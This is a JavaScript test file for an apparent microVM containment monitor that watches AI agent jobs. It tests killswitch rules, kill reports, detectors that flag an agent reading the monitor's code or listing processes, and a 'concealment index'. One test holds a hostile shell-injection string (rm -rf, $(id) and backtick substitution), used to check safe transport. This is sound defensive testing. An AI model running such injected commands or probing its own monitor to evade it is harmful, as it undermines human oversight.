    await runFixture(["--gc-core-embed", coreFile]);
    const blockFile = join(dir, "block.json");
    writeFileSync(blockFile, extraction.stdout);
    const harness = join(dir, "prod-sequence.sh");
    writeFileSync(harness, [
      "set -euo pipefail",
      `. ${JSON.stringify(coreFile)}`,
      funcText,
      `fixture_root=${JSON.stringify(dir)}`,
      `fixture_id=${JSON.stringify(fixtureId)}`,
      `domain=${JSON.stringify("agentic-driver-" + fixtureId)}`,
      `remote_host=${JSON.stringify("test-host")}`,
      `containment_block=$(cat ${JSON.stringify(blockFile)})`,
      "domain_absent=true",
      "domain_destroy_requested=true",
      "acl_restored=true",
      prodBlock,
    ].join("\n"));
    const run = spawnSync("bash", [harness], { encoding: "utf8" });
    assert.equal(run.status, 0, run.stderr || "production sequence must succeed (fixture_fail must not fire)");
    // 5. The report exists at the advertised path, is truthful, and its
    // teardown fields are finalized — no PENDING remains.
    const reportRaw = await readFile(reportPath, "utf8");
    const report = JSON.parse(reportRaw);
    assert.equal(report.schema, "agentic-driver.guest-containment.kill-report.v1");
    assert.equal(report.session.fixtureId, fixtureId);
    assert.equal(report.session.remoteHost, "test-host");
    assert.equal(report.killswitch.tripped, true);
    assert.equal(report.killswitch.rule, "GC-NET-002");
    assert.equal(report.killswitch.tier, "HIGH");
    assert.deepEqual(report.teardown, { domainAbsent: true, destroyRequested: true, aclRestored: true });
    assert.ok(!reportRaw.includes("PENDING"), "no teardown field may remain PENDING after finalization");
    assert.equal(report.logSha256, block.logSha256, "report digest must match the receipt-advertised evidence digest");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- M6 security repairs: shell-safe payload transport, argv-count guard ---

test("M6/sec: a hostile multi-line payload travels shell-safe (base64, no whitespace or metacharacters)", async () => {
  const dir = await tempState();
  try {
    const hostile = "/bin/busybox sh -c 'echo ok'\nrm -rf /tmp/x; `id` $(id) \"quoted\" 'single' | pipe &\ttab";
    const targetPath = targetConfigFile(dir, { jobPayload: hostile });
    const confirmBodies = [];
    const executed = [];
    const harness = runHarness(targetPath, (id, sh) => stubV2Receipt(id, sh, "2".repeat(64)), confirmBodies, executed);
    const value = await runLinuxMicroVMCutover(harness.context, harness.options);
    assert.equal(value.ok, true, JSON.stringify(value.reason ?? {}));
    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
    const payloadArg = fixtureExec.at(-1);
    assert.match(payloadArg, /^[A-Za-z0-9+/=]+$/, "the remote shell must see no whitespace, quote, or metacharacter");
    assert.equal(Buffer.from(payloadArg, "base64").toString("utf8"), hostile, "hostile payload round-trips exactly");
    assert.match(confirmBodies[0], /Guest job payload \(user-configured\):/);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("M6/sec: the fixture accepts 2..5 argv and rejects fewer or more before any side effect", async () => {
  const id = "microvm-" + "b".repeat(24);
  const hash = "1".repeat(64);
  for (const args of [[id], [id, hash, "1", "128", "aGk=", "extra"], ["only-one"]]) {
    const r = spawnSync("bash", [FIXTURE, ...args], { encoding: "utf8" });
    assert.notEqual(r.status, 0, `argv count ${args.length} must be rejected: ${JSON.stringify(args.slice(0, 2))}`);
    assert.match(r.stderr, /phase=identity/, "rejection happens at the argv guard, before setup work");
  }
  // The historical guard bug: the tool always passes 4 (plain) or 5 (containment) args.
  const source = await readFile(FIXTURE, "utf8");
  assert.ok(source.includes('if [ "$#" -lt 2 ] || [ "$#" -gt 5 ]'), "guard must accept the tool's real arities");
});

test("M6/sec: the fixture decodes and validates the base64 payload (accept and reject cases)", async () => {
  const b64 = (text) => Buffer.from(text, "utf8").toString("base64");
  const good = "/bin/busybox sh -c 'echo session-work'\n# comment line\nsleep 1";
  const ok = spawnSync("bash", [FIXTURE, "--gc-payload-validate", b64(good)], { encoding: "utf8" });
  assert.equal(ok.status, 0, ok.stderr);
  assert.equal(ok.stdout.trimEnd(), good, "decoded payload must round-trip exactly");
  const rejects = {
    "not base64 charset": "!!!not-base64!!!",
    "decodes over the 8192-byte bound": b64("x".repeat(8193)),
    "decodes to a non-printable byte": b64("bad\x01payload"),
    "decodes to empty": b64(""),
  };
  for (const [label, arg] of Object.entries(rejects)) {
    const r = spawnSync("bash", [FIXTURE, "--gc-payload-validate", arg], { encoding: "utf8" });
    assert.notEqual(r.status, 0, `${label} must be rejected`);
    assert.match(r.stderr, /invalid containment job payload/);
  }
});

// --- GC-PROBE concealment class (Task #132 item 1) ---

test("GC-PROBE detectors fire on monitor introspection and enumeration", async () => {
  const dir = await tempState();
  try {
    const fs = JSON.parse(await runFixture(["--gc-fs-detect", join(dir, "s"), "/gc/core.sh"]));
    assert.equal(fs.rule, "GC-PROBE-001");
    const shimCat = JSON.parse(await runFixture(["--gc-shim", join(dir, "s2"), "cat", "/gc/core.sh"]));
    assert.equal(shimCat.rule, "GC-PROBE-001");
    const shimPs = JSON.parse(await runFixture(["--gc-shim", join(dir, "s3"), "ps", "-ef"]));
    assert.equal(shimPs.rule, "GC-PROBE-002");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("GC-PROBE probes accumulate ELEVATED pressure and trip at the threshold", async () => {
  const dir = await tempState();
  const state = join(dir, "s");
  try {
    for (let i = 0; i < 4; i++) {
      const d = JSON.parse(await runFixture(["--gc-fs-detect", state, "/gc/core.sh"]));
      assert.equal(d.rule, "GC-PROBE-001");
    }
    const trip = JSON.parse(await runFixture(["--gc-fs-detect", state, "/gc/core.sh"]));
    assert.equal(trip.decision, "deny");
    const log = await readFile(join(state, "containment.log.jsonl"), "utf8");
    const ks = JSON.parse(log.trim().split("\n").at(-1));
    assert.equal(ks.trigger.rule, "GC-PROBE-001");
    assert.equal(ks.trigger.class, "GC-PROBE");
    assert.equal(ks.trigger.tier, "ELEVATED");
    assert.equal(ks.trigger.mode, "aggregate");
    assert.equal(ks.trigger.threshold, 5);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("concealmentIndex is surfaced in the receipt block and validated host-side", async () => {
  const fixtureId = "microvm-" + "e".repeat(24);
  const TAX = TAXONOMY_SHA256;
  const mk = (seq, cls, val) => compact({ schema: "agentic-driver.guest-containment.log.v1", session: fixtureId, taxonomy: "guest-containment-taxonomy.v1", taxonomySha256: TAX, event: { ts: "t", seq, source: "shim", class: cls, action: "deny", subject: { type: "exec", value: val } } });
  const lines = [mk(1, "GC-PROBE", "cat /gc/core.sh"), mk(2, "unknown", "novel-thing")];
  const payload = lines.join("\n") + "\n";
  const end = compact({ schema: "agentic-driver.guest-containment.log.v1", session: fixtureId, taxonomy: "guest-containment-taxonomy.v1", taxonomySha256: TAX, event: { ts: "t", seq: 3, source: "supervisor", class: "session-end", action: "complete", summary: true } });
  const full = payload + end + "\n";
  const b64 = Buffer.from(full, "utf8").toString("base64").replace(/(.{76})/g, "$1\n");
  const dir = await tempState();
  try {
    const transcript = join(dir, "console.typescript");
    writeFileSync(transcript, `AGENTIC_CONTAINMENT_BEGIN:${fixtureId}\r\n${b64.replaceAll("\n", "\r\n")}\r\nAGENTIC_CONTAINMENT_END:${fixtureId}\r\n`);
    const block = JSON.parse((await envelopeExtract(transcript, fixtureId)).stdout);
    assert.equal(block.probes, 1);
    // Formula: probes(1) + 2*unknown-class denials(1) = 3.
    assert.equal(block.concealmentIndex, 3);
    assert.equal(block.histogram["GC-PROBE"], 1);
    const receipt = stubV2Receipt(fixtureId, "1".repeat(64), block.logSha256);
    receipt.containment = block;
    const validated = validateLinuxMicroVMReceipt(receipt, stubFactsShape(fixtureId), fixtureId, "1".repeat(64), { containment: true });
    assert.equal(validated.status, "VERIFIED");
    const bad = stubV2Receipt(fixtureId, "1".repeat(64), block.logSha256);
    bad.containment.concealmentIndex = "high";
    assert.throws(() => validateLinuxMicroVMReceipt(bad, stubFactsShape(fixtureId), fixtureId, "1".repeat(64), { containment: true }));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Live-proof defect fixes: kernel-thread false positives, trip freeze, kill report ---

test("Defect 1: the proc-watcher sweep skips kernel threads (empty cmdline, ppid 2)", async () => {
  const dir = await tempState();
  try {
    // Simulated /proc: kernel thread (empty cmdline), kthreadd child (ppid 2),
    // userspace unknown, and the allowlisted shell.
    const base = join(dir, "proc");
    const mk = (pid, { cmdline = null, comm, ppid = null }) => {
      mkdirSync(join(base, pid), { recursive: true });
      writeFileSync(join(base, pid, "comm"), comm);
      if (cmdline !== null) writeFileSync(join(base, pid, "cmdline"), cmdline);
      writeFileSync(join(base, pid, "stat"), `1 (x) S ${ppid ?? 1} 1 1 0 0 0 0 0 0`);
    };
    mkdirSync(base, { recursive: true });
    mk("10", { comm: "kthreadd", ppid: 0 });                 // empty cmdline: kernel thread
    mk("20", { comm: "kworker/u8:2", cmdline: "", ppid: 2 }); // kernel thread, ppid 2
    mk("30", { comm: "evil-agent", cmdline: "evil\0agent", ppid: 100 });
    mk("31", { comm: "sh", cmdline: "sh\0/job.sh", ppid: 100 });
    const out = (await runFixture(["--gc-proc-sweep", base])).trim().split("\n");
    assert.deepEqual(out, ["evil-agent", "sh"], "kernel threads must not be flagged; userspace processes must be");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Config-save round-trip: the target save must not strip jobPayload ---

test("live-sequence regression: a confirmed target save preserves jobPayload and the run stays in containment mode", async () => {
  const dir = await tempState();
  try {
    // The user's existing config carries the payload (plus allocation and a
    // comment); the model relays the SAME target and the user confirms.
    const configPath = targetConfigFile(dir, { vcpu: 4, memoryMiB: 2048, jobPayload: JOB_PAYLOAD, _comment: "user comment" });
    const confirmBodies = [];
    const executed = [];
    const harness = runHarness(configPath, (id, sh) => stubV2Receipt(id, sh, "2".repeat(64)), confirmBodies, executed);
    const value = await runLinuxMicroVMCutover(harness.context, {
      ...harness.options,
      targetUserConfigPath: configPath,
      target: "user@test-microvm-host",
    });
    // Before the fix the save rewrote the config WITHOUT jobPayload, so this
    // same invocation flipped to plain proof mode (v1) and dropped the job.
    assert.equal(value.ok, true, JSON.stringify(value.reason ?? {}));
    assert.equal(value.schema, LINUX_MICROVM_CUTOVER_SCHEMA_V2);
    const after = JSON.parse(await readFile(configPath, "utf8"));
    assert.equal(after.jobPayload, JOB_PAYLOAD, "jobPayload must survive the save");
    assert.equal(after.vcpu, 4);
    assert.equal(after.memoryMiB, 2048);
    assert.equal(after._comment, "user comment");
    assert.equal(after.sshTarget, "user@test-microvm-host");
    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
    assert.equal(Buffer.from(fixtureExec.at(-1), "base64").toString("utf8"), JOB_PAYLOAD, "payload still reaches the fixture argv");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("Defect 1: the decision path is frozen after a trip — no re-trips, no pressure growth", async () => {
  const dir = await tempState();
  const state = join(dir, "s");
  try {
    const first = JSON.parse(await runFixture(["--gc-net-detect", state, "socket-row"]));
    assert.equal(first.rule, "GC-NET-001");
    const logAfterTrip = await readFile(join(state, "containment.log.jsonl"), "utf8");
    const ksCount = logAfterTrip.split("\n").filter((l) => l.includes("killswitch.v1")).length;
    assert.equal(ksCount, 2, "exactly one trip (trigger event + terminal killswitch line)");
    // Post-trip events: frozen decision, log unchanged, no new pressure.
    const frozen = JSON.parse(await runFixture(["--gc-fs-detect", state, "/etc/again"]));
    assert.equal(frozen.frozen, true);
    const frozen2 = JSON.parse(await runFixture(["--gc-fs-detect", state, "/etc/again2"]));
    assert.equal(frozen2.frozen, true);
    assert.equal(await readFile(join(state, "containment.log.jsonl"), "utf8"), logAfterTrip);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("a save that switches the decision to local keeps jobPayload and drops only sshTarget", async () => {
  const dir = await tempState();
  try {
    const configPath = targetConfigFile(dir, { jobPayload: JOB_PAYLOAD });
    const harness = runHarness(configPath, (id, sh) => stubV2Receipt(id, sh, "2".repeat(64)), [], []);
    await runLinuxMicroVMCutover(harness.context, {
      ...harness.options,
      targetUserConfigPath: configPath,
      target: "local",
    });
    const after = JSON.parse(await readFile(configPath, "utf8"));
    assert.equal(after.local, true);
    assert.equal(after.sshTarget, undefined, "exactly one decision: sshTarget is replaced");
    assert.equal(after.jobPayload, JOB_PAYLOAD, "jobPayload survives the decision switch");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("Defect 2: a tripped killswitch produces a durable kill report; clean sessions do not", async () => {
  const fixtureId = "microvm-" + "d".repeat(24);
  const dir = await tempState();
  try {
    // Trip path: envelope with a GC-CRED trip and the report path passed.
    const { body, expectedLogSha } = envelopeTranscript(fixtureId, envelopePayloadLines(fixtureId));
    // The fixture root layout: the transcript is always console.typescript,
    // so the saved payload lands next to it for the kill report.
    const transcript = join(dir, "console.typescript");
    writeFileSync(transcript, body);
    const reportPath = join(dir, "kill-report.json");
    const extraction = await envelopeExtract(transcript, fixtureId, reportPath);
    assert.equal(extraction.status, 0, extraction.stderr);
    const block = JSON.parse(extraction.stdout);
    assert.equal(block.killReportPath, reportPath);
    // Write the report from the saved payload + block (fixture main-flow behavior).
    // Block travels as an argv argument (never stdin; bounded at 64 KiB).
    // The hook prints the report path; the durable report is the file itself.
    await runFixture([
      "--gc-kill-report", dir, fixtureId, `agentic-driver-${fixtureId}`, "test-host", extraction.stdout.trim(),
    ]);
    const report = JSON.parse(await readFile(reportPath, "utf8"));
    assert.equal(report.schema, "agentic-driver.guest-containment.kill-report.v1");
    assert.equal(report.session.fixtureId, fixtureId);
    assert.equal(report.killswitch.tripped, true);
    assert.equal(report.killswitch.rule, "GC-CRED-001");
    assert.equal(report.killswitch.class, "GC-CRED");
    assert.equal(report.killswitch.tier, "CRITICAL");
    assert.equal(report.killswitch.mode, "immediate");
    // Immediate trips carry null pressure/threshold; aggregate trips carry counts.
    assert.ok(report.killswitch.pressure === null || /^\d+$/.test(report.killswitch.pressure));
    assert.ok(Array.isArray(report.lastEvents) || typeof report.lastEvents === "string");
    assert.match(report.logSha256, new RegExp(`^${expectedLogSha.slice(0, 8)}`));
    // Host validation: the receipt with the report path validates...
    const receipt = stubV2Receipt(fixtureId, "1".repeat(64), block.logSha256);
    const validated = validateLinuxMicroVMReceipt(receipt, stubFactsShape(fixtureId), fixtureId, "1".repeat(64), { containment: true });
    assert.equal(validated.status, "VERIFIED");
    // ...a tripped receipt WITHOUT the report path is rejected...
    const noReport = stubV2Receipt(fixtureId, "1".repeat(64), "2".repeat(64));
    delete noReport.containment.killReportPath;
    assert.throws(() => validateLinuxMicroVMReceipt(noReport, stubFactsShape(fixtureId), fixtureId, "1".repeat(64), { containment: true }));
    // ...and a clean (non-trip) session carries no report path.
    const clean = stubV2Receipt(fixtureId, "1".repeat(64), "2".repeat(64), { tripped: false });
    assert.equal(clean.containment.killReportPath, undefined);
    const cleanBlock = JSON.parse((await (async () => {
      const t2 = join(dir, "t2");
      writeFileSync(t2, `AGENTIC_CONTAINMENT_BEGIN:${fixtureId}\r\n${Buffer.from(JSON.stringify({ schema: "agentic-driver.guest-containment.log.v1", event: { ts: "t", seq: 1, source: "supervisor", class: "session-end", action: "complete", summary: true } }) + "\n", "utf8").toString("base64")}\r\nAGENTIC_CONTAINMENT_END:${fixtureId}\r\n`);
      return envelopeExtract(t2, fixtureId);
    })()).stdout);
    assert.equal(cleanBlock.killReportPath, undefined);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("a fresh save writes the one decision; a later hand-added jobPayload loads and activates containment", async () => {
  const dir = await tempState();
  try {
    const configPath = join(dir, "microvm-target.v1.json");
    const harness = runHarness(configPath, (id, sh) => stubV1Receipt(id, sh), [], []);
    const plain = await runLinuxMicroVMCutover(harness.context, {
      ...harness.options,
      targetUserConfigPath: configPath,
      target: "user@test-microvm-host",
    });
    assert.equal(plain.ok, true);
    assert.equal(plain.schema, LINUX_MICROVM_CUTOVER_SCHEMA, "fresh save = plain proof mode");
    assert.deepEqual(JSON.parse(await readFile(configPath, "utf8")),
      { schema: "agentic-driver.microvm-target.v1", sshTarget: "user@test-microvm-host" });
    // The user then adds jobPayload by hand; the next run must load it.
    const edited = JSON.parse(await readFile(configPath, "utf8"));
    edited.jobPayload = JOB_PAYLOAD;
    writeFileSync(configPath, JSON.stringify(edited, null, 2) + "\n");
    const executed = [];
    const harness2 = runHarness(configPath, (id, sh) => stubV2Receipt(id, sh, "2".repeat(64)), [], executed);
    const contained = await runLinuxMicroVMCutover(harness2.context, harness2.options);
    assert.equal(contained.ok, true, JSON.stringify(contained.reason ?? {}));
    assert.equal(contained.schema, LINUX_MICROVM_CUTOVER_SCHEMA_V2, "hand-added jobPayload activates containment");
    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
    assert.equal(Buffer.from(fixtureExec.at(-1), "base64").toString("utf8"), JOB_PAYLOAD);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Live-proof regression: console window must stay open for the envelope ---

test("console wait: a containment run waits for the late envelope instead of tearing down at first marker", async () => {
  const dir = await tempState();
  try {
    const fid = "microvm-" + "d".repeat(24);
    const transcript = join(dir, "console.typescript");
    writeFileSync(transcript, "guest boot noise\r\n");
    // Stub recorder: writes the marker quickly, the envelope END anchor only
    // ~1.4 s later — the live shape (envelope is a session-END emission).
    const writer = `f=$1
( sleep 0.2; printf '%s\\r\\n' 'AGENTIC_MICROVM_PROBE:${fid}' >>"$f"
  sleep 1.2; printf '%s\\r\\n' 'AGENTIC_CONTAINMENT_END:${fid}' >>"$f"
  sleep 30 ) &
w=$!
bash ${JSON.stringify(FIXTURE)} --gc-console-wait "$f" '${fid}' true "$w" 240
rc=$?
kill "$w" 2>/dev/null
exit $rc`;
    const run = spawnSync("bash", ["-c", writer, "w", transcript], { encoding: "utf8" });
    assert.equal(run.status, 0, run.stderr);
    assert.match(await readFile(transcript, "utf8"), /AGENTIC_CONTAINMENT_END:/, "wait ended only after the envelope anchor arrived");
    // Wiring guard: the fixture's phase=console must route containment runs
    // through the envelope wait (a hook-only fix would not close the race).
    const fixtureSource = await readFile(FIXTURE, "utf8");
    assert.ok(fixtureSource.includes('gc_console_wait "$fixture_root/console.typescript" "$fixture_id" true "$recorder_pid" "$GC_ENVELOPE_WAIT_ATTEMPTS"'),
      "containment runs must wait for the envelope END anchor before teardown");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("console wait: plain proof mode still breaks at the marker (recorder window unchanged)", async () => {
  const dir = await tempState();
  try {
    const fid = "microvm-" + "e".repeat(24);
    const transcript = join(dir, "console.typescript");
    writeFileSync(transcript, "guest boot noise\r\n");
    const writer = `f=$1
( sleep 0.2; printf '%s\\r\\n' 'AGENTIC_MICROVM_PROBE:${fid}' >>"$f"
  sleep 1.5; printf '%s\\r\\n' 'AGENTIC_CONTAINMENT_END:${fid}' >>"$f"
  sleep 30 ) &
w=$!
bash ${JSON.stringify(FIXTURE)} --gc-console-wait "$f" '${fid}' false "$w" 90
rc=$?
kill "$w" 2>/dev/null
exit $rc`;
    const run = spawnSync("bash", ["-c", writer, "w", transcript], { encoding: "utf8" });
    assert.equal(run.status, 0, run.stderr);
    assert.doesNotMatch(await readFile(transcript, "utf8"), /AGENTIC_CONTAINMENT_END:/,
      "plain mode must return at first marker, before the (absent) envelope");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("console wait: bounded when the envelope never arrives (fail-closed, no hang)", async () => {
  const dir = await tempState();
  try {
    const fid = "microvm-" + "f".repeat(24);
    const transcript = join(dir, "console.typescript");
    writeFileSync(transcript, `AGENTIC_MICROVM_PROBE:${fid}\r\n`);
    const sleeper = spawnSync("bash", ["-c", "sleep 30 >/dev/null 2>&1 & echo $!"], { encoding: "utf8" });
    const recorderPid = sleeper.stdout.trim();
    const started = Date.now();
    const run = spawnSync("bash", [FIXTURE, "--gc-console-wait", transcript, fid, "true", recorderPid, "4"], { encoding: "utf8", timeout: 15000 });
    assert.equal(run.status, 1, "bound expiry without the envelope must report failure");
    assert.ok(Date.now() - started < 10000, "the wait is bounded");
    spawnSync("bash", ["-c", `kill ${recorderPid} 2>/dev/null`]);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("session end: a zero-event session still creates its terminal record and log", async () => {
  const dir = await tempState();
  try {
    const state = join(dir, "empty-session");
    const run = spawnSync("bash", [FIXTURE, "--gc-session-end", state], { encoding: "utf8" });
    assert.equal(run.status, 0, run.stderr);
    const log = await readFile(join(state, "containment.log.jsonl"), "utf8");
    const event = JSON.parse(log.trim().split("\n").at(-1));
    assert.equal(event.event.class, "session-end");
    assert.equal(event.event.action, "complete");
    assert.match(event.taxonomySha256, /^[0-9a-f]{64}$/, "taxonomy bootstrapped for the digest");
    // The resulting log must be envelope-ready: extraction accepts it.
    const fid = "microvm-" + "9".repeat(24);
    const b64 = Buffer.from(log, "utf8").toString("base64").replace(/(.{76})/g, "$1\n");
    const transcript = join(dir, "console.typescript");
    writeFileSync(transcript, `AGENTIC_CONTAINMENT_BEGIN:${fid}\r\n${b64.replaceAll("\n", "\r\n")}\r\nAGENTIC_CONTAINMENT_END:${fid}\r\n`);
    const extraction = await envelopeExtract(transcript, fid);
    assert.equal(extraction.status, 0, extraction.stderr);
    assert.equal(JSON.parse(extraction.stdout).killswitch.tripped, false);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Regression guard: the set -u initializer cannot be lost again ---
// The containment_payload initializer was lost twice (faec800 regeneration,
// then the 18:05 branch reset). Under set -u its absence aborts any
// plain-proof (4-arg) run at the first unconditional reference.

test("set -u guard: containment_payload is initialized at parse time before any unconditional reference", async () => {
  const fixtureSource = await readFile(FIXTURE, "utf8");
  const lines = fixtureSource.split("\n");
  const initIdx = lines.findIndex((l) => l.trim() === 'containment_payload=""');
  assert.ok(initIdx > 0, "containment_payload=\"\" initializer missing from the fixture script");
  const initLine = initIdx + 1;
  // The argv default and the initializer must sit together in the argument
  // section, before every unconditional reference to the variable.
  const argvIdx = lines.findIndex((l) => l.includes("containment_payload_b64=${5:-}"));
  assert.ok(argvIdx > 0);
  assert.ok(initLine > argvIdx && initLine - argvIdx <= 5, "initializer must sit with the argv parse");
});
